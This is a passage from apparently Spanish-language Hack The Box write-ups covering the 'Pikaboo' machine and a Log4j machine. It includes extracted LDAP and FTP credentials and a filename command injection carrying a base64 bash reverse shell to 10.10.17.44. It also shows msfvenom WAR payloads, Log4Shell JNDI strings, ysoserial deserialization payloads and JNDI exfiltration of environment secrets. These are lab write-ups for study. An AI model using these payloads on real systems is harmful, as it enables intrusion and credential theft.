19 12:14 data -rw-r--r-- 1 root root 1802 Jul 6 20:16 docker-compose.yml drwxr-xr-x 4 root root 4096 May 19 12:04 graphql -rw-r--r-- 1 root root 113 Jul 6 20:16 gunicorn.py.ini -rwxr-xr-x 1 root root 249 Jul 6 20:16 manage.py drwxr-xr-x 4 root root 4096 May 27 05:46 pokemon_v2 -rw-r--r-- 1 root root 375 Jul 6 20:16 requirements.txt -rw-r--r-- 1 root root 86 Jul 6 20:16 test-requirements.txt Dentro del directorio /opt/pokeapi/config se encuentra un archivo settings.py con credenciales para LDAP:\nwww-data@pikaboo:/$ ls -la /opt/pokeapi/config/ total 28 -rwxr-xr-x 1 root root 0 Jul 6 20:17 __init__.py drwxr-xr-x 2 root root 4096 Jul 6 16:10 __pycache__ -rw-r--r-- 1 root root 783 Jul 6 20:17 docker-compose.py -rwxr-xr-x 1 root root 548 Jul 6 20:17 docker.py -rwxr-xr-x 1 root root 314 Jul 6 20:17 local.py -rwxr-xr-x 1 root root 3080 Jul 6 20:17 settings.py -rwxr-xr-x 1 root root 181 Jul 6 20:17 urls.py -rwxr-xr-x 1 root root 1408 Jul 6 20:17 wsgi.py www-data@pikaboo:/$ cat /opt/pokeapi/config/settings.py # ... DATABASES = {  \u0026#34;ldap\u0026#34;: {  \u0026#34;ENGINE\u0026#34;: \u0026#34;ldapdb.backends.ldap\u0026#34;,  \u0026#34;NAME\u0026#34;: \u0026#34;ldap:///\u0026#34;,  \u0026#34;USER\u0026#34;: \u0026#34;cn=binduser,ou=users,dc=pikaboo,dc=htb\u0026#34;,  \u0026#34;PASSWORD\u0026#34;: \u0026#34;J~42%W?PFHl]g\u0026#34;,  },  \u0026#34;default\u0026#34;: {  \u0026#34;ENGINE\u0026#34;: \u0026#34;django.db.backends.sqlite3\u0026#34;,  \u0026#34;NAME\u0026#34;: \u0026#34;/opt/pokeapi/db.sqlite3\u0026#34;,  } } # ... Enumeración por LDAP Después de buscar información sobre LDAP y ldapsearch (por ejemplo, aquí), vemos algunos comandos útiles.\nEn el comando ldapsearch hay que especificar cn=binduser,ou=users,dc=pikaboo,dc=htb como bind DN (Distinguished Name) y dc=pikaboo,dc=htb como base DN para realizar la búsqueda:\nwww-data@pikaboo:/$ ldapsearch -xD \u0026#39;cn=binduser,ou=users,dc=pikaboo,dc=htb\u0026#39; -w \u0026#39;J~42%W?PFHl]g\u0026#39; -b \u0026#39;dc=pikaboo,dc=htb\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;dc=pikaboo,dc=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL #  # pikaboo.htb dn: dc=pikaboo,dc=htb objectClass: domain dc: pikaboo  # ftp.pikaboo.htb dn: dc=ftp,dc=pikaboo,dc=htb objectClass: domain dc: ftp  # users, pikaboo.htb dn: ou=users,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users  # pokeapi.pikaboo.htb dn: dc=pokeapi,dc=pikaboo,dc=htb objectClass: domain dc: pokeapi  # users, ftp.pikaboo.htb dn: ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users  # groups, ftp.pikaboo.htb dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: groups  # pwnmeow, users, ftp.pikaboo.htb dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount uid: pwnmeow cn: Pwn sn: Meow loginShell: /bin/bash uidNumber: 10000 gidNumber: 10000 homeDirectory: /home/pwnmeow userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==  # binduser, users, pikaboo.htb dn: cn=binduser,ou=users,dc=pikaboo,dc=htb cn: binduser objectClass: simpleSecurityObject objectClass: organizationalRole userPassword:: Sn40MiVXP1BGSGxdZw==  # users, pokeapi.pikaboo.htb dn: ou=users,dc=pokeapi,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users  # groups, pokeapi.pikaboo.htb dn: ou=groups,dc=pokeapi,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: groups  # search result search: 2 result: 0 Success  # numResponses: 11 # numEntries: 10 Podemos ver qué permisos tiene pwnmeow sobre FTP. Veamos esta información añadiendo dc=ftp al base DN para obtener resultados más concretos:\nwww-data@pikaboo:/$ ldapsearch -xD \u0026#39;cn=binduser,ou=users,dc=pikaboo,dc=htb\u0026#39; -w \u0026#39;J~42%W?PFHl]g\u0026#39; -b \u0026#39;dc=ftp,dc=pikaboo,dc=htb\u0026#39; # extended LDIF # # LDAPv3 # base \u0026lt;dc=ftp,dc=pikaboo,dc=htb\u0026gt; with scope subtree # filter: (objectclass=*) # requesting: ALL #  # ftp.10.10.10.249 dn: dc=ftp,dc=pikaboo,dc=htb objectClass: domain dc: ftp  # users, ftp.10.10.10.249 dn: ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: users  # groups, ftp.10.10.10.249 dn: ou=groups,dc=ftp,dc=pikaboo,dc=htb objectClass: organizationalUnit objectClass: top ou: groups  # pwnmeow, users, ftp.10.10.10.249 dn: uid=pwnmeow,ou=users,dc=ftp,dc=pikaboo,dc=htb objectClass: inetOrgPerson objectClass: posixAccount objectClass: shadowAccount uid: pwnmeow cn: Pwn sn: Meow loginShell: /bin/bash uidNumber: 10000 gidNumber: 10000 homeDirectory: /home/pwnmeow userPassword:: X0cwdFQ0X0M0dGNIXyczbV80bEwhXw==  # search result search: 2 result: 0 Success  # numResponses: 5 # numEntries: 4 Ahora podemos conectarnos por FTP como pwnmeow utilizando la siguiente contraseña:\n$ echo X0cwdFQ0X0M0dGNIXyczbV80bEwhXw== | base64 -d _G0tT4_C4tcH_\u0026#39;3m_4lL!_ $ ftp pwnmeow@10.10.10.249 Connected to 10.10.10.249. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. Encontrando una tarea Cron Tras esto, podemos verificar que pwnmeow está en el grupo ftp y listar archivos que pertenecen a este grupo:\nwww-data@pikaboo:/$ cat /etc/group | grep pwnmeow pwnmeow:x:1000:pwnmeow ftp:x:115:pwnmeow www-data@pikaboo:/$ find / -group ftp 2\u0026gt;/dev/null /srv/ftp /srv/ftp/growth_rate_prose /srv/ftp/ability_changelog_prose /srv/ftp/types /srv/ftp/item_names /srv/ftp/language_names ... Por otro lado, podemos listar más scripts de Python como se muestra:\nwww-data@pikaboo:/$ find / -name *.py 2\u0026gt;/dev/null | grep -vE \u0026#39;python|share\u0026#39; /usr/local/bin/django-admin.py /opt/pokeapi/__init__.py /opt/pokeapi/manage.py /opt/pokeapi/data/__init__.py /opt/pokeapi/data/v2/__init__.py /opt/pokeapi/data/v2/build.py /opt/pokeapi/config/wsgi.py /opt/pokeapi/config/local.py /opt/pokeapi/config/__init__.py /opt/pokeapi/config/docker.py /opt/pokeapi/config/settings.py /opt/pokeapi/config/urls.py /opt/pokeapi/config/docker-compose.py /opt/pokeapi/pokemon_v2/__init__.py /opt/pokeapi/pokemon_v2/migrations/0006_auto_20200725_2205.py /opt/pokeapi/pokemon_v2/migrations/__init__.py /opt/pokeapi/pokemon_v2/migrations/0001_squashed_0002_auto_20160301_1408.py /opt/pokeapi/pokemon_v2/migrations/0009_pokemontypepast.py /opt/pokeapi/pokemon_v2/migrations/0005_auto_20200709_1930.py /opt/pokeapi/pokemon_v2/migrations/0002_itemsprites_pokemonformsprites_pokemonsprites.py /opt/pokeapi/pokemon_v2/migrations/0007_auto_20200815_0610.py /opt/pokeapi/pokemon_v2/migrations/0008_auto_20201123_2045.py /opt/pokeapi/pokemon_v2/migrations/0004_iso639length_20191217.py /opt/pokeapi/pokemon_v2/migrations/0003_auto_20160530_1132.py /opt/pokeapi/pokemon_v2/migrations/0010_pokemonformtype.py /opt/pokeapi/pokemon_v2/urls.py /opt/pokeapi/pokemon_v2/test_models.py /opt/pokeapi/pokemon_v2/serializers.py /opt/pokeapi/pokemon_v2/models.py /opt/pokeapi/pokemon_v2/tests.py /opt/pokeapi/pokemon_v2/api.py Existe un archivo en /usr/local/bin/django-admin.py. De hecho, en este directorio hay un script para una tarea Cron:\nwww-data@pikaboo:/$ ls -l /usr/local/bin total 44 drwxr-xr-x 2 root root 4096 Jul 6 18:57 __pycache__ -rwxr-xr-x 1 root root 218 May 19 12:07 coverage -rwxr-xr-x 1 root root 218 May 19 12:07 coverage-3.7 -rwxr-xr-x 1 root root 218 May 19 12:07 coverage3 -rwxr--r-- 1 root root 6444 Jun 1 10:55 csvupdate -rwxr--r-- 1 root root 116 Jun 1 09:40 csvupdate_cron -rwxr-xr-x 1 root root 266 Jul 6 18:57 django-admin -rwxr-xr-x 1 root root 125 Jul 6 18:57 django-admin.py -rwxr-xr-x 1 root root 220 May 19 12:07 gunicorn -rwxr-xr-x 1 root root 219 Jul 6 18:55 sqlformat www-data@pikaboo:/tmp$ cat /usr/local/bin/csvupdate_cron #!/bin/bash  for d in /srv/ftp/* do  cd $d  /usr/local/bin/csvupdate $(basename $d) *csv  /usr/bin/rm -rf * done Esta tarea Cron está ejecutando csvupdate, que es un script escrito en Perl:\nroot@pikaboo:/srv/ftp/abilities# cat /usr/local/bin/csvupdate #!/usr/bin/perl  ################################################################## # Script for upgrading PokeAPI CSV files with FTP-uploaded data. # # # # Usage: # # ./csvupdate \u0026lt;type\u0026gt; \u0026lt;file(s)\u0026gt; # # # # Arguments: # # - type: PokeAPI CSV file type # # (must have the correct number of fields) # # - file(s): list of files containing CSV data # ##################################################################  use strict; use warnings; use Text::CSV;  my $csv_dir = \u0026#34;/opt/pokeapi/data/v2/csv\u0026#34;;  my %csv_fields = (  \u0026#39;abilities\u0026#39; =\u0026gt; 4,  \u0026#39;ability_changelog\u0026#39; =\u0026gt; 3,  \u0026#39;ability_changelog_prose\u0026#39; =\u0026gt; 3,  \u0026#39;ability_flavor_text\u0026#39; =\u0026gt; 4,  \u0026#39;ability_names\u0026#39; =\u0026gt; 3,  \u0026#39;ability_prose\u0026#39; =\u0026gt; 4,  # ...  \u0026#39;version_group_pokemon_move_methods\u0026#39; =\u0026gt; 2,  \u0026#39;version_group_regions\u0026#39; =\u0026gt; 2,  \u0026#39;version_groups\u0026#39; =\u0026gt; 4,  \u0026#39;version_names\u0026#39; =\u0026gt; 3,  \u0026#39;versions\u0026#39; =\u0026gt; 3 );   if($#ARGV \u0026lt; 1) {  die \u0026#34;Usage: $0 \u0026lt;type\u0026gt; \u0026lt;file(s)\u0026gt;\\n\u0026#34;; }  my $type = $ARGV[0]; if(!exists $csv_fields{$type}) {  die \u0026#34;Unrecognised CSV data type: $type.\\n\u0026#34;; }  my $csv = Text::CSV-\u0026gt;new({ sep_char =\u0026gt; \u0026#39;,\u0026#39; });  my $fname = \u0026#34;${csv_dir}/${type}.csv\u0026#34;; open(my $fh, \u0026#34;\u0026gt;\u0026gt;\u0026#34;, $fname) or die \u0026#34;Unable to open CSV target file.\\n\u0026#34;;  shift; for(\u0026lt;\u0026gt;) {  chomp;  if($csv-\u0026gt;parse($_))  {  my @fields = $csv-\u0026gt;fields();  if(@fields != $csv_fields{$type})  {  warn \u0026#34;Incorrect number of fields: \u0026#39;$_\u0026#39;\\n\u0026#34;;  next;  }  print $fh \u0026#34;$_\\n\u0026#34;;  } }  close($fh); Explotando una inyección de comandos Este script csvupdate_cron es vulnerable a inyección de comandos porque utiliza un wildcard en el archivo CSV. Para explotar la vulnerabilidad, la idea es almacenar un archivo con un nombre malicioso que contenga un comando de sistema.\nEl archivo malicioso debe guardarse en un directorio de /srv/ftp:\nwww-data@pikaboo:/ ls -la /srv/ftp total 712 drwxr-xr-x 176 root ftp 12288 May 20 2021 . drwxr-xr-x 3 root root 4096 May 10 2021 .. drwx-wx--- 2 root ftp 4096 Dec 4 14:20 abilities drwx-wx--- 2 root ftp 4096 May 20 2021 ability_changelog drwx-wx--- 2 root ftp 4096 May 20 2021 ability_changelog_prose drwx-wx--- 2 root ftp 4096 May 20 2021 ability_flavor_text drwx-wx--- 2 root ftp 4096 May 20 2021 ability_names drwx-wx--- 2 root ftp 4096 May 20 2021 ability_prose ... drwx-wx--- 2 root ftp 4096 May 20 2021 version_group_pokemon_move_methods drwx-wx--- 2 root ftp 4096 May 20 2021 version_group_regions drwx-wx--- 2 root ftp 4096 May 20 2021 version_groups drwx-wx--- 2 root ftp 4096 May 20 2021 version_names drwx-wx--- 2 root ftp 4096 May 20 2021 versions Podemos utilizar versions, por ejemplo. Entonces, podremos subir el archivo malicioso con el nombre especial y obtener una reverse shell como root:\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx Ahora debemos subir el archivo y nombrarlo con el comando inyectado de manera remota:\n$ touch file $ ftp pwnmeow@10.10.10.249 Connected to 10.10.10.249. 220 (vsFTPd 3.0.3) 331 Please specify the password. Password: 230 Login successful. ftp\u0026gt; dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. drwx-wx--- 2 ftp ftp 4096 May 20 09:54 abilities drwx-wx--- 2 ftp ftp 4096 May 20 08:01 ability_changelog ... drwx-wx--- 2 ftp ftp 4096 May 20 08:01 version_names drwx-wx--- 2 ftp ftp 4096 Sep 12 22:29 versions 226 Directory send OK. ftp\u0026gt; cd versions 250 Directory successfully changed. ftp\u0026gt; put (local-file) file (remote-file) \u0026#34;|echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv\u0026#34; 200 PORT command successful. Consider using PASV. 150 Ok to send data. 226 Transfer complete. Como se muestra, el nombre del archivo está construido de tal forma que el comando ejecutado por la tarea Cron es:\n/usr/local/bin/csvupdate $(basename $d) |echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash|.csv El uso de pipes (|) se debe a que fue la única manera de ejecutar comandos correctamente. Antes, se utilizaron varios punto y coma y sentencias OR, pero ninguna funcionó.\nY la razón por la que este tipo de inyección de comandos funcionó es por un comportamiento extraño de Perl (se conoce como: inyección de argumentos abiertos en Perl, más información aquí).\nY finalmente, obtenemos acceso como root y podemos leer la flag root.txt:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.10.249. Ncat: Connection from 10.10.10.249:47382. bash: cannot set terminal process group (7636): Inappropriate ioctl for device bash: no job control in this shell root@pikaboo:/srv/ftp/versions# cat /root/root.txt 3904cd5b02fd88be5264107d52282460 Como añadido, todos los pasos necesarios para comprometer la máquina se han programado en un script en Python llamado autopwn.py (explicación detallada aquí):\n$ python3 autopwn.py 10.10.17.44 [*] FTP log (/var/log/vsftpd.log) has been poisoned [+] Trying to bind to :: on port 4444: Done [+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47390 [*] Found user: pwnmeow [!] Found user.txt: f3417b113fe715a58e02f9e29fe6c736 [*] Found LDAP user: cn=binduser,ou=users,dc=pikaboo,dc=htb [*] Found LDAP password: J~42%W?PFHl]g [*] Found FTP password: _G0tT4_C4tcH_\u0026#39;3m_4lL!_ [*] Stored malicious file with injected command in filename [+] Trying to bind to :: on port 4444: Done [+] Waiting for connections on :::4444: Got connection from ::ffff:10.10.10.249 on port 47396 [!] Found root.txt: 3904cd5b02fd88be5264107d52282460 [+] Got shell as root [*] Switching to interactive mode root@pikaboo:/srv/ftp/abilities# ","image":"/images/HTB/Pikaboo/Pikaboo.png","permalink":"https://7rocky.github.io/htb/pikaboo/","section":"htb","summary":"Hack The Box. Linux. Máquina difícil. Esta máquina utiliza nginx y Apache como servidores web con una mala configuración que deriva en navegación de directorios y posteriormente en inclusión de archivos locales. Existen credenciales de FTP en LDAP y una tarea Cron que es vulnerable a inyección de comandos. Para comprometer esta máquina se necesita enumeración web, conocimiento sobre nginx y LDAP, técnicas de explotación de inclusión de archivos y trucos de inyección de comandos. En este write-up se utiliza un script en Python personalizado para comprometer la máquina desde cero","time":12,"title":"Pikaboo"},{"contents":"  SO: Linux   Dificultad: Media   Dirección IP: 10.10.11.138   Fecha: 03 / 12 / 2021   Escaneo de puertos # Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.138 -p 21,22,80,8080 Nmap scan report for 10.10.11.138 Host is up (0.049s latency).  PORT STATE SERVICE VERSION 21/tcp filtered ftp 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 ea:84:21:a3:22:4a:7d:f9:b5:25:51:79:83:a4:f5:f2 (RSA) | 256 b8:39:9e:f4:88:be:aa:01:73:2d:10:fb:44:7f:84:61 (ECDSA) |_ 256 22:21:e9:f4:85:90:87:45:16:1f:73:36:41:ee:3b:32 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: Ultimate Hacking Championship 8080/tcp filtered http-proxy Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done -- 1 IP address (1 host up) scanned in 11.18 seconds La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP). Los puertos 21 (FTP) y 8080 (HTTP) están filtrados.\nEnumeración web Si vamos a http://10.10.11.138 veremos una página como esta:\nApliquemos fuzzing con ffuf para ver si hay rutas útiles:\n$ ffuf -w $WORDLISTS/dirbuster/directory-list-2.3-medium.txt -u http://10.10.11.138/FUZZ images [Status: 302, Size: 0, Words: 1, Lines: 1] admin [Status: 403, Size: 277, Words: 20, Lines: 10] manager [Status: 403, Size: 277, Words: 20, Lines: 10]  [Status: 200, Size: 489, Words: 23, Lines: 33] server-status [Status: 403, Size: 277, Words: 20, Lines: 10] Mirando al resultado, parece que el servidor está ejecutando Tomcat. Esto se puede verificar buscando un archivo que no existe. Por ejemplo, /robots.txt:\nSe está utilizando Tomcat/9.0.31. Sin embargo, nmap mostraba que el servidor era Apache/2.4.41. También hay que recordar que el puerto 8080 estaba filtrado.\nEl puerto de Tomcat por defecto es el 8080. Es posible que Apache esté configurado en el puerto 80 para redirigir las peticiones a Tomcat en el puerto 8080. El servidor Apache está bloqueando el acceso directo a /manager (donde se encuentra el panel de administración de Tomcat). Esta configuración puede llevar a problemas de navegación de directorios.\nBurlando las restricciones de Apache Mirando en HackTricks, podemos utilizar /;param=value/manager/html para saltarnos el bloqueo de Apache y acceder al panel de administración de Tomcat. Al solicitarnos credenciales, usamos las que vienen por defecto (tomcat:tomcat) y entramos:\nAhora podemos realizar la explotación de Tomcat clásica. Esto es, desplegar un fichero WAR malicioso para obtener una reverse shell en el servidor. Para ello, utilizamos msfvenom:\n$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.44 LPORT=4444 -f war -o rev.war Payload size: 1106 bytes Final size of war file: 1106 bytes Saved as: rev.war Y ahora lo subimos. No obstante, el panel muestra un error:\n[org.apache.tomcat.util.http.fileupload.impl.FileSizeLimitExceededException: The field deployWar exceeds its maximum permitted size of 1 bytes.] Como se muestra, el servidor dice que el tamaño máximo permitido es de 1 B. Entonces, no podemos comprometer Tomcat del modo tradicional.\nExplotación de Log4j Podemos darnos cuenta de que el mensaje de error viene de algún gestor de logs como puede ser Log4j. Este paquete de Java tiene una funcionalidad de búsqueda JNDI (Java Naming and Directory Interface). A lo mejor es vulnerable a CVE-2021-44228 (Log4Shell).\nUtilizando Burp Suite para examinar la petición POST de subida del archivo WAR, vemos que el nombre del parámetro es deployWar, que además se refleja en el mensaje de error. Podemos cambiar este nombre por un payload común de explotación de Log4j (${jndi:ldap://\u0026lt;ip\u0026gt;/a}) y ver si se recibe una conexión.\nPara ello, podemos escuchar en el puerto 389 (LDAP) con nc:\n$ nc -nlvp 389 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::389 Ncat: Listening on 0.0.0.0:389 Luego, realizamos la petición POST con Burp Suite:\nY vemos que recibimos una conexión:\n$ nc -nlvp 389 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::389 Ncat: Listening on 0.0.0.0:389 Ncat: Connection from 10.10.11.138. Ncat: Connection from 10.10.11.138:49432. 0  ` Ahora que sabemos que el servidor realiza búsquedas JNDI, podemos utilizar un servidor LDAP malicioso para inyectar un objeto Java serializado que nos envíe una reverse shell.\nPara este propósito, estaremos utilizando JNDI-Exploit-Kit para exponer el servidor LDAP y también ysoserial-modified para crear el objeto serializado malicioso.\nPrimero, creamos el payload:\n$ echo -n \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.17.44/4444 0\u0026gt;\u0026amp;1\u0026#39; | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ java -jar target/ysoserial-modified.jar CommonsCollections5 bash \u0026#39;echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash\u0026#39; \u0026gt; payload.ser Y luego iniciamos el servidor LDAP:\n$ java -jar target/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.17.44:1389 -P payload.ser ... [HTTP_ADDR] \u0026gt;\u0026gt; 10.10.17.44 [RMI_ADDR] \u0026gt;\u0026gt; 10.10.17.44 [LDAP_ADDR] \u0026gt;\u0026gt; 10.10.17.44 ----------------------------JNDI Links---------------------------- Target environment(Build in JDK - (BYPASS WITH GROOVY by @orangetw) whose trustURLCodebase is false and have Tomcat 8+ and Groovy in classpath): rmi://10.10.17.44:1099/fjg93d Target environment(Build in JDK 1.7 whose trustURLCodebase is true): rmi://10.10.17.44:1099/v0aeol ldap://10.10.17.44:1389/v0aeol Target environment(Build in JDK 1.5 whose trustURLCodebase is true): rmi://10.10.17.44:1099/znv8ap ldap://10.10.17.44:1389/znv8ap Target environment(Build in JDK 1.8 whose trustURLCodebase is true): rmi://10.10.17.44:1099/twjpgf ldap://10.10.17.44:1389/twjpgf Target environment(Build in JDK 1.6 whose trustURLCodebase is true): rmi://10.10.17.44:1099/hzdycs ldap://10.10.17.44:1389/hzdycs Target environment(Build in JDK - (BYPASS WITH EL by @welk1n) whose trustURLCodebase is false and have Tomcat 8+ or SpringBoot 1.2.x+ in classpath): rmi://10.10.17.44:1099/w2zulv ----------------------------Server Log---------------------------- [JETTYSERVER] \u0026gt;\u0026gt; Listening on 10.10.17.44:8180 [RMISERVER] \u0026gt;\u0026gt; Listening on 10.10.17.44:1099 [LDAPSERVER] \u0026gt;\u0026gt; Listening on 0.0.0.0:1389 Utilizando Burp Suite otra vez, podemos enviar el siguiente payload JNDI:${jndi:ldap://10.10.17.44:1389/twjpgf} en la misma petición POST y obtener la conexión en nc:\n$ nc -nlvp 4444 Ncat: Version 7.92 ( https://nmap.org/ncat ) Ncat: Listening on :::4444 Ncat: Listening on 0.0.0.0:4444 Ncat: Connection from 10.10.11.138. Ncat: Connection from 10.10.11.138:59150. bash: cannot set terminal process group (789): Inappropriate ioctl for device bash: no job control in this shell tomcat@LogForge:/var/lib/tomcat9$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null tomcat@LogForge:/var/lib/tomcat9$ ^Z zsh: suspended ncat -nlvp 4444 $ stty raw -echo; fg [1] + continued ncat -nlvp 4444  reset xterm tomcat@LogForge:/var/lib/tomcat9$ export TERM=xterm tomcat@LogForge:/var/lib/tomcat9$ export SHELL=bash tomcat@LogForge:/var/lib/tomcat9$ stty rows 50 columns 158 Enumeración del sistema Existe un usuario llamado htb:\ntomcat@LogForge:/var/lib/tomcat9$ ls /home htb Su directorio personal es legible. Por tanto, podemos leer la flag user.txt:\ntomcat@LogForge:/var/lib/tomcat9$ ls -la /home/htb total 24 drwxrwxr-x 1 htb htb 174 Dec 21 00:53 . drwxr-xr-x 1 root root 6 Jul 2 18:57 .. lrwxrwxrwx 1 root root 9 Dec 21 00:52 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 htb htb 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 htb htb 3771 Feb 25 2020 .bashrc drwx------ 1 htb htb 40 Jul 2 18:58 .cache -rw-r--r-- 1 htb htb 807 Feb 25 2020 .profile -rw-r--r-- 1 htb htb 0 Jul 2 18:58 .sudo_as_admin_successful -rw------- 1 htb htb 3404 Dec 21 00:53 .viminfo -rw-r--r-- 1 root root 33 Dec 24 05:26 user.txt tomcat@LogForge:/var/lib/tomcat9$ cat /home/htb/user.txt 6b62392136128e4b1d1c2769fee24010 Podemos recordar que el puerto 21 (FTP) estaba filtrado en el resultado de nmap. De hecho, existe un servidor FTP en ejecución mediante un proyecto Java personalizado:\ntomcat@LogForge:/var/lib/tomcat9$ ps -faux USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND ... root 757 0.0 0.0 5568 3072 ? Ss 05:26 0:00 /usr/sbin/cron -f root 955 0.0 0.0 7248 3372 ? S 05:27 0:00 \\_ /usr/sbin/CRON -f root 962 0.0 0.0 2608 548 ? Ss 05:27 0:00 \\_ /bin/sh -c /root/run.sh root 963 0.0 0.0 5648 3096 ? S 05:27 0:00 \\_ /bin/bash /root/run.sh root 964 0.1 1.7 3576972 70076 ? Sl 05:27 0:25 \\_ java -jar /root/ftpServer-1.0-SNAPSHOT-all.jar Explorando el servidor FTP Afortunadamente, el archivo JAR se puede encontrar en el directorio raíz:\ntomcat@LogForge:/var/lib/tomcat9$ ls -la / total 2060 drwxr-xr-x 1 root root 224 Dec 21 20:09 . drwxr-xr-x 1 root root 224 Dec 21 20:09 .. lrwxrwxrwx 1 root root 7 Jul 31 2020 bin -\u0026gt; usr/bin drwxr-xr-x 1 root root 294 Dec 21 01:21 boot drwxr-xr-x 1 root root 0 Jul 2 18:33 cdrom drwxr-xr-x 17 root root 3820 Dec 24 05:26 dev drwxr-xr-x 1 root root 3176 Dec 21 20:04 etc -rw-r--r-- 1 root root 2048143 Dec 18 11:49 ftpServer-1.0-SNAPSHOT-all.jar drwxr-xr-x 1 root root 6 Jul 2 18:57 home lrwxrwxrwx 1 root root 7 Jul 31 2020 lib -\u0026gt; usr/lib lrwxrwxrwx 1 root root 9 Jul 31 2020 lib32 -\u0026gt; usr/lib32 lrwxrwxrwx 1 root root 9 Jul 31 2020 lib64 -\u0026gt; usr/lib64 lrwxrwxrwx 1 root root 10 Jul 31 2020 libx32 -\u0026gt; usr/libx32 drwxr-xr-x 1 root root 0 Jul 31 2020 media drwxr-xr-x 1 root root 0 Jul 31 2020 mnt drwxr-xr-x 1 root root 0 Jul 31 2020 opt dr-xr-xr-x 287 root root 0 Dec 24 05:26 proc drwx------ 1 root root 236 Dec 21 15:10 root drwxr-xr-x 25 root root 740 Dec 24 05:26 run lrwxrwxrwx 1 root root 8 Jul 31 2020 sbin -\u0026gt; usr/sbin drwxr-xr-x 1 root root 0 Jul 31 2020 srv dr-xr-xr-x 13 root root 0 Dec 24 05:26 sys drwxrwxrwt 1 root root 34 Dec 24 05:26 tmp drwxr-xr-x 1 root root 128 Jul 2 19:17 usr drwxr-xr-x 1 root root 106 Dec 14 20:31 var Podemos transferirlo a nuestra máquina y descompilarlo utilizando una herramienta como javadecompilers.com.\nExisten dos archivos Java en el proyecto: Server.java y Worker.java. El segundo contiene información útil:\npackage main.java.com.ippsec.ftpServer;  import org.apache.logging.log4j.LogManager; // .. import org.apache.logging.log4j.Logger;  public class Worker extends Thread {  // ...   public Worker(final Socket client, final int dataPort) {  this.debugMode = true;  this.fileSeparator = \u0026#34;/\u0026#34;;  this.transferMode = transferType.ASCII;  this.currentUserStatus = userStatus.NOTLOGGEDIN;  this.validUser = System.getenv(\u0026#34;ftp_user\u0026#34;);  this.validPassword = System.getenv(\u0026#34;ftp_password\u0026#34;);  this.quitCommandLoop = false;  this.controlSocket = client;  this.dataPort = dataPort;  this.currDirectory = \u0026#34;/root\u0026#34;;  this.root = \u0026#34;/\u0026#34;;  }   // ...  } Como se puede ver, el nombre de usuario y la contraseña para FTP están almacenadas en las variables de entorno ftp_user y ftp_password. Además, el servidor FTP utiliza Log4j.\nPara obtener el valor de estas variables de entorno, podemos explotar la búsqueda JNDI de Log4j de nuevo. No obstante, no podremos inyectar un objeto serializado con ysoserial-modified porque el proyecto Java no incluye ningún paquete vulnerable a deserialización insegura.\nEntonces, solamente podemos realizar una exfiltración de datos por LDAP utilizando el servidor LDAP anterior. Para obtener estos datos, se puede utilizar Wireshark.\nExfiltración por LDAP Desde la máquina, nos podemos conectar al servidor FTP e inyectar la búsqueda JNDI mientras capturamos con Wireshark.\ntomcat@LogForge:/var/lib/tomcat9$ cd /tmp tomcat@LogForge:/tmp$ ftp localhost Connected to localhost. 220 Welcome to the FTP-Server Name (localhost:tomcat): ${jndi:ldap://10.10.17.44:1389/${env:ftp_user}:${env:ftp_password}} 530 Not logged in Login failed. Nótese que ${env:ftp_user} imprimirá el valor de la variable de entorno llamada ftp_user.\nLos logs del servidor LDAP dicen que la conexión se ha recibido, pero no muestran más información. En Wireshark sí podemos ver la información que queremos:\nComo se muestra, las credenciales para FTP son: ippsec:log4j_env_leakage. Ahora podemos iniciar sesión correctamente:\nftp\u0026gt; user ippsec 331 User name okay, need password Password: 230-Welcome to HKUST 230 User logged in successfully Remote system type is FTP. ftp\u0026gt; dir 200 Command OK 125 Opening ASCII mode data connection for file list. .profile .ssh snap 